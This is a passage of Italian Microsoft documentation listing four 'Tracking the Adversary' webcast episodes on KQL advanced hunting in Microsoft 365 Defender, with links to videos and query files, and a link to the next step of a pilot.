|Episodio 1: Nozioni fondamentali su KQL|Verranno trattate le nozioni di base sulle funzionalità di ricerca avanzate in Microsoft 365 Defender. Informazioni sui dati di ricerca avanzati disponibili e sulla sintassi e sugli operatori KQL di base.|[MP4](https://aka.ms/MTP15JUL20_MP4)|[YouTube](https://youtu.be/0D9TkGjeJwM)|[Episodio 1: file CSL in Git](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%201%20-%20KQL%20Fundamentals.csl)|
|Episodio 2: Join|Continueremo a conoscere i dati nella ricerca avanzata e su come unire le tabelle. Informazioni sui join interni, esterni, univoci e semi e sulle sfumature dell'innerunique join Kusto predefinito.|[MP4](https://aka.ms/MTP22JUL20_MP4)|[YouTube](https://youtu.be/LMrO6K5TWOU)|[Episodio 2: file CSL in Git](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%202%20-%20Joins.csl)|
|Episodio 3: Riepilogo, pivot e visualizzazione dei dati|Ora che siamo in grado di filtrare, modificare e unire i dati, è il momento di iniziare a riepilogare, quantificare, eseguire pivot e visualizzare. In questo episodio verrà descritto l'operatore di riepilogo e alcuni dei calcoli che è possibile eseguire durante l'immersione in tabelle aggiuntive nello schema di ricerca avanzata. I set di dati vengono trasformati in grafici che consentono di migliorare l'analisi.|[MP4](https://aka.ms/MTP29JUL20_MP4)|[YouTube](https://youtu.be/UKnk9U1NH6Y)|[Episodio 3: file CSL in Git](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%203%20-%20Summarizing%2C%20Pivoting%2C%20and%20Joining.csl)|
|Episodio 4: Diamo la caccia! Applicazione di KQL al rilevamento degli eventi imprevisti|È ora di tenere traccia di alcune attività degli utenti malintenzionati. In questo episodio useremo la nostra migliore comprensione di KQL e la ricerca avanzata in Microsoft 365 Defender per tenere traccia di un attacco. Scopri alcuni dei suggerimenti e dei trucchi usati nel campo per tenere traccia dell'attività degli utenti malintenzionati, tra cui gli ABC della cybersecurity e come applicarli alla risposta agli incidenti.|[MP4](https://aka.ms/MTP5AUG20_MP4)|[YouTube](https://youtu.be/2EUxOc_LNd8)|[Episodio 4: file CSL in Git](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%204%20-%20Lets%20Hunt.csl)|
|

## <a name="next-step"></a>Passaggio successivo

|![Fase di chiusura e riepilogo](../../media/mtp/close.png) <br>[Fase di chiusura e riepilogo](m365d-pilot-close.md)|Analizza il Microsoft 365 pilota di Defender, presentalo agli stakeholder e fai il passaggio successivo.
|:-----|:-----|
